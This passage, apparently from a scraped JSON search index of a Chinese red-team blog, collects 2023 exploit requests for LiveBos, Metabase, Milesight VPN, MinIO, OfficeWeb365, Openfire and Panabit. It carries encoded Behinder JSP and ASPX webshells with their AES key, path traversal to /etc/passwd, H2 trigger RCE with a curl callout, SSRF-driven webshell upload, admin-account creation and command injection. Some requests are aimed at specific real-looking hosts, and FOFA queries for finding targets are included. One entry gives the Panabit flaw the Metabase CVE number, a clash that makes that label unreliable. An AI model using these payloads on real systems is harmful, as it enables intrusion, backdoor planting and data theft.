act=put\u0026scope=0\u0026name=gName13\u0026value=content%3Dorg.apache.commons.codec.binary.StringUtils.newString%28java.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decodeBase64%28%22PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4%3D%22%29%2C%22UTF-8%22%29%2B%22%22%3Bbytes%3Djava.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decode%28%22yv66vgAAADEA5AoATgBcCABdCgAcAF4IAF8KABwAYAgAYQoAHABiCgAcAGMIAGQKABwAZQgAZgoAZwBoCgBNAGkIAGoKAE0AawgAbAoAbQBuCgAcAG8IAHAKABwAcQgAcggAcwcAdAoAFwBcCgAXAHUIAHYKABcAdwcAeAgAeQgAeggAewgAfAgAfQoAfgB%2FCgB%2BAIAHAIEKAIIAgwoAJACECACFCgAkAIYKACQAhwoAJACICgCCAIkKAIIAigcAiwoALQB3CACMCgAcAI0IAI4KAH4AjwcAkAoAZwCRCgAzAJIKADMAgwoAggCTCgAzAJMKADMAlAoAlQCWCgCVAJcKAJgAmQoAmACaBQAAAAAAAAAyCgCbAJwKAIIAnQoAMwCeCACfCgAtAKAIAKEIAKIHAKMKAEcAjQoAHACkCgBHAKUKAEcAmggApgcApwcAqAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAHcmV2ZXJzZQEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0ludGVnZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAHQzEuamF2YQwATwBQAQAADACpAKoBABBjb21tYW5kIG5vdCBudWxsDACrAKwBAAUjIyMjIwwArQCuDACvALABAAE6DACxALIBACJjb21tYW5kIHJldmVyc2UgaG9zdCBmb3JtYXQgZXJyb3IhBwCzDAC0ALUMAFYAVwEABUBAQEBADABVAFQBAAdvcy5uYW1lBwC2DAC3AFQMALgArAEAA3dpbgwAuQC6AQAEcGluZwEAAi1uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALsAvAEABSAtbiA0DAC9AKwBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kAQACL2MBAAUgLXQgNAEAAnNoAQACLWMHAL4MAL8AwAwAVQDBAQARamF2YS91dGlsL1NjYW5uZXIHAMIMAMMAxAwATwDFAQACXGEMAMYAxwwAyADJDADKAKwMAMsAxAwAzABQAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABy9iaW4vc2gMAE8AzQEAB2NtZC5leGUMAFUAzgEAD2phdmEvbmV0L1NvY2tldAwAzwDQDABPANEMANIA0wwA1ADJBwDVDADWANAMANcA0AcA2AwAWADZDADaAFAHANsMANwA3QwA3gDQDADfAFABAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwA4ACsAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAOEA4gwAWADjAQACb2sBAAJDMQEAEGphdmEvbGFuZy9PYmplY3QBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvSW50ZWdlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kBABUoTGphdm","date":"2023-12-08","objectID":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:1","tags":["2023hw"],"title":"LiveBos ScriptVariable.jsp 远程代码执行漏洞","uri":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"2 POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 28 act=get\u0026scope=0\u0026name=gName13 ","date":"2023-12-08","objectID":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:2","tags":["2023hw"],"title":"LiveBos ScriptVariable.jsp 远程代码执行漏洞","uri":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"3 GET /5aB7Bc80daBC3d56.jsp;.css.jsp HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:3","tags":["2023hw"],"title":"LiveBos ScriptVariable.jsp 远程代码执行漏洞","uri":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 207 {\"hostinfo\":\"http://item.tpre.cn:9999\",\"vulfile\":\"CVD-2023-2800.go\",\"expparams\":{\"attackType\":\"webshell\",\"cmd\":\"whoami\",\"webshell\":\"behinder\",\"filename\":\"abcsj.jsp\",\"content\":\"\u003c% out.println(\\\"hello\\\");%\u003e\"}} ","date":"2023-12-08","objectID":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"LiveBos ScriptVariable.jsp 远程代码执行漏洞","uri":"/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"LiveBos\" || body=\"/react/browser/loginBackground.png\" ","date":"2023-12-08","objectID":"/livebos-showimage.do-%E6%96%87%E4%BB%B6-imgname-%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"LiveBos ShowImage.do 文件 imgName 参数读取漏洞","uri":"/livebos-showimage.do-%E6%96%87%E4%BB%B6-imgname-%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /feed/ShowImage.do;.js.jsp?type=\u0026imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/livebos-showimage.do-%E6%96%87%E4%BB%B6-imgname-%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"LiveBos ShowImage.do 文件 imgName 参数读取漏洞","uri":"/livebos-showimage.do-%E6%96%87%E4%BB%B6-imgname-%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"首先 get 访问/api/session/properties 获取 token，然后运行如下 POC\rPOST /api/setup/validate HTTP/1.1 Host: Content-Length: 242 Content-Type: application/json Accept-Encoding: gzip { \"token\": \"e83dbb0a-196e-4a25-977c-8c31b022b4ef\", \"details\": { \"details\": { \"db\":\"file:./metabase.db\", \"advanced-options\": false, \"ssl\": true, \"init\": \"CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '//javascript\\njava.lang.Runtime.getRuntime().exec(\\\"open -a calculator\\\")'\"}, \"name\": \"x\", \"engine\": \"h2\" } } ","date":"2023-12-08","objectID":"/metabase-apisetupvalidate-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"Metabase apisetupvalidate 远程代码执行漏洞","uri":"/metabase-apisetupvalidate-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Metabase validate 远程命令执行漏洞（CVE-2023-38646） 网络测绘 app=“元数据库” /api/session/properties POST /api/setup/validate HTTP/1.1 Host: Content-Type: application/json Content-Length: 812 { \"token\": \"e56e2c0f-71bf-4e15-9879-d964f319be69\", \"details\": { \"is_on_demand\": false, \"is_full_sync\": false, \"is_sample\": false, \"cache_ttl\": null, \"refingerprint\": false, \"auto_run_queries\": true, \"schedules\": {}, \"details\": { \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('curl ecw14d.dnslog.cn')\\n$$--=x\", \"advanced-options\": false, \"ssl\": true }, \"name\": \"an-sec-research-team\", \"engine\": \"h2\" } } ","date":"2023-12-08","objectID":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-38646/:1:0","tags":["2023hw漏洞"],"title":"Metabase validate 远程命令执行漏洞（CVE-2023-38646）","uri":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-38646/"},{"categories":["2023hw"],"content":"# Milesight VPN server.js 任意文件读取漏洞\r","date":"2023-12-08","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"Milesight VPN server.js 任意文件读取漏洞","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 MilesightVPN 是一款软件，可使 Milesight 产品的 VPN 通道设置过程更加简便，并可通过网络服务器界面监控连接状态。其中存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件 ","date":"2023-12-08","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"Milesight VPN server.js 任意文件读取漏洞","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 Milesight VPN ","date":"2023-12-08","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"Milesight VPN server.js 任意文件读取漏洞","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 “MilesightVPN” ","date":"2023-12-08","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"Milesight VPN server.js 任意文件读取漏洞","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC GET /../etc/passwd HTTP/1.1 Host: Accept: */* Content-Type: application/x-www-form-urlencoded ","date":"2023-12-08","objectID":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"Milesight VPN server.js 任意文件读取漏洞","uri":"/milesight-vpn-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432）\r","date":"2023-12-08","objectID":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/:0:0","tags":["2023hw"],"title":"MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432）","uri":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/"},{"categories":["2023hw"],"content":"漏洞描述： \u003cspan style=\\\"color: var(--primaryFont-color);\\\"\u003eMinIO 是一种开源的对象存储服务，它兼容 Amazon S3 API，可以在私有云或公有云中使用。MinIO 是一种高性能、高可用性的分布式存储系统，它可以存储大量数据，并提供对数据的高速读写能力。MinIO 采用分布式架构，可以在多个节点上运行，从而实现数据的分布式存储和处理。 ","date":"2023-12-08","objectID":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/:1:0","tags":["2023hw"],"title":"MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432）","uri":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/"},{"categories":["2023hw"],"content":"fofa title=\"MinIO Browser\" || banner=\"MinIO\" || header=\"MinIO\" ","date":"2023-12-08","objectID":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/:2:0","tags":["2023hw"],"title":"MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432）","uri":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/"},{"categories":["2023hw"],"content":"poc POST /minio/bootstrap/v1/verify HTTP/1.1 Host: User-Agent: Mozilla/5.0 Upgrade-Insecure-Requests: 1 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: en-US;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 ","date":"2023-12-08","objectID":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/:3:0","tags":["2023hw"],"title":"MinIO verify 接口敏感信息泄露漏洞（CVE-2023-28432）","uri":"/minio-verify-%E6%8E%A5%E5%8F%A3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9Ecve-2023-28432/"},{"categories":["2023hw"],"content":"需要提前准备 2 个文件，一个 ashx 和一个 txt 文件\r将这两个文件打包为 2.zip，然后起一个 http 服务提供给网站远程下载 然后访问?furl=http://你的公网服务器/2.zip 随后即可发现网站对该 zip 进行了下载和解压，这里可以预览 txt 格式文件获取 zippath 参 数的值 然后 ashx 文件的地址即为: http://x.x.x.x/cache/office/x.x.x.x.x/82308141956519700010097_486/2.ashx https://sview.sv3d.cn:8443/?furl=http://xx.xx.xx.xx/2.zip https://sview.sv3d.cn:8443/cache/office/xx.xx.xx.xx.80/82308181306555000010050_833/ ","date":"2023-12-08","objectID":"/officeweb365-furl-ssrf-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"OfficeWeb365 furl SSRF 文件上传漏洞","uri":"/officeweb365-furl-ssrf-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## 前言\r360漏洞云监测到网传《OfficeWeb365 远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经上传漏洞云情报平台，平台编号：360LDYLD-2023-00002453 ","date":"2023-12-08","objectID":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"OfficeWeb365 SaveDraw 任意文件上传漏洞","uri":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"细节 POST /PW/SaveDraw?path=../../Content/img\u0026idx=1.aspx HTTP/1.1 Host:xxx User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36 Content-Length: 2265 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close data:image/png;base64,01s34567890123456789y12345678901234567m91\u003c%@ Page Language=\"C#\" %\u003e \u003c%@Import Namespace=\"System.Reflection\" %\u003e \u003cscript runat=\"server\"\u003e private byte[] Decrypt(byte[] data) { string key=\"e45e329feb5d925b\"; data = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data)); System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged(); aes.Mode = System.Security.Cryptography.CipherMode.ECB; aes.Key = Encoding.UTF8.GetBytes(key); aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7; return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length); } private byte[] Encrypt(byte[] data) { string key = \"e45e329feb5d925b\"; System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged(); aes.Mode = System.Security.Cryptography.CipherMode.ECB; aes.Key = Encoding.UTF8.GetBytes(key); aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7; return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length))); } \u003c/script\u003e \u003c% //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(Decrypt(c)).CreateInstance(\"U\").Equals(this); byte[] c=Request.BinaryRead(Request.ContentLength); string asname=System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79}); Type assembly=Type.GetType(asname); MethodInfo load = assembly.GetMethod(\"Load\",new Type[] {new byte[0].GetType()}); object obj=load.Invoke(null, new object[]{Decrypt(c)}); MethodInfo create = assembly.GetMethod(\"CreateInstance\",new Type[] { \"\".GetType()}); string name = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 }); object pay=create.Invoke(obj,new object[] { name }); pay.Equals(this);%\u003e\u003e--- shell：https://xxx/Content/img/UserDraw/drawPW1.aspx 冰蝎4，deafult_aes ","date":"2023-12-08","objectID":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"OfficeWeb365 SaveDraw 任意文件上传漏洞","uri":"/officeweb365-savedraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"OfficeWeb365 文件上传漏洞 【消息详情】：360漏洞云监测到网传《OfficeWeb365 远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经上传漏洞云情报平台，平台编号：360LDYLD-2023-00002453，情报订阅用户可登录漏洞云情报平台( https://loudongyun.360.cn/bug/list )查看漏洞详情。 360漏洞云监测到网传《OfficeWeb365远程代码执行漏洞》的消息，经漏洞云复核，确认为【真实】漏洞，漏洞影响【未知】版本，该漏洞标准化POC已经升级漏洞云情报平台，平台编号： 360LDYLD-2023-0000245 POST /PW/SaveDraw?path=../../Content/img\u0026idx=1.aspx HTTP/1.1 Host: Content-Length: 500817 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4 Accept-Encoding: gzip, deflate data:image/png;base64,01s34567890123456789y12345678901234567m91\u003c% @ Page Language=\"C #\"%\u003e \u003c% @ Import namespace=\"System. Reflection\"%\u003e \u003cScript Run=\"Server\"\u003e Private byte decryption (byte data) { String key=\"e45e329feb5d925b\"; Data=Convert. FromBase64String (System. Text. Encoding. UTF8. GetString (data)); System. Security. Cryptography. RijndaelManaged aes=new System. Security. Cryptography. RijndaelManaged(); Aes. Mode=System. Security. Cryptography. CipherMode. ECB; Aes. Key=Encoding. UTF8. GetBytes (key); Aes. Padding=System. Security. Cryptography. PaddingMode. PKCS7; Return aes. CreateDecryptor(). TransformFinalBlock (data, 0, data. Length); } Private Byte Encryption (Byte Data) { String key=\"e45e329feb5d925b\"; System. Security. Cryptography. RijndaelManaged aes=new System. Security. Cryptography. RijndaelManaged(); Aes. Mode=System. Security. Cryptography. CipherMode. ECB; Aes. Key=Encoding. UTF8. GetBytes (key); Aes. Padding=System. Security. Cryptography. PaddingMode. PKCS7; Return System. Text. Encoding. UTF8. GetBytes (Convert. ToBase64String (aes. CreateEncryptor(). TransformFinalBlock (data, 0, data. Length))); } \u003c/Script\u003e \u003c% //Byte [] c=Request. BinaryRead (Request. ContentLength); Assembly. Load (Decrypt (c)). CreateInstance (\"U\"). Equals (this); Byte [] c=Request. BinaryRead (Request. ContentLength); String asname=System. Text. Encoding. ASCII. GetString (new byte [] {0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2e, 0x52, 0x65, 0x66, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x2e, 0x41, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79}); Type Assembly=Type. GetType (asname); MethodInfo load=assembly. GetMethod (\"Load\", new Type [] {new byte [0]. GetType()}); Object obj=load. Invoke (null, new object [] {Decrypt (c)}); MethodInfo create=assembly. GetMethod (\"CreateInstance\", new Type [] {\"\". GetType()}); String name=System. Text. Encoding. ASCII. GetString (new byte [] {0x55}); Object pay=create. Invoke (obj, new object [] {name}); Pay. Equals (this);%\u003e\u003e--- ","date":"2023-12-08","objectID":"/officeweb365-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"OfficeWeb365 文件上传漏洞","uri":"/officeweb365-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Openfire身份认证绕过漏洞(CVE-2023-32315) GET /user-create.jsp?csrf=Sio3WOA89y2L9Rl\u0026username=user1\u0026name=\u0026email=\u0026password=Qwer1234\u0026passwordConfirm=Qwer1234\u0026isadmin=on\u0026create=............ HTTP/1.1 ","date":"2023-12-08","objectID":"/openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ecve-2023-32315/:1:0","tags":["2023hw漏洞"],"title":"Openfire身份认证绕过漏洞(CVE-2023-32315)","uri":"/openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9Ecve-2023-32315/"},{"categories":["2023hw漏洞"],"content":"Panabit iXCache网关RCE漏洞CVE-2023-38646 POST /cgi-bin/Maintain/date_config HTTP/1.1 Host: 127.0.0.1:8443 Cookie: pauser_9667402_260=paonline_admin_44432_9663; pauser_9661348_661=paonline_admin_61912_96631 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0 Content-Type: application/x-www-form-urlencoded Content-Length: 107 ntpserver=0.0.0.0%3Bwhoami\u0026year=2000\u0026month=08\u0026day=15\u0026hour=11\u0026minute=34\u0026second=53\u0026ifname=fxp1 ","date":"2023-12-08","objectID":"/panabit-ixcache%E7%BD%91%E5%85%B3rce%E6%BC%8F%E6%B4%9Ecve-2023-38646/:1:0","tags":["2023hw漏洞"],"title":"Panabit iXCache网关RCE漏洞CVE-2023-38646","uri":"/panabit-ixcache%E7%BD%91%E5%85%B3rce%E6%BC%8F%E6%B4%9Ecve-2023-38646/"},{"categories":["2023hw漏洞"],"content":"Panel loadfile 后台文件读取漏洞 POST /api/v1/file/loadfile 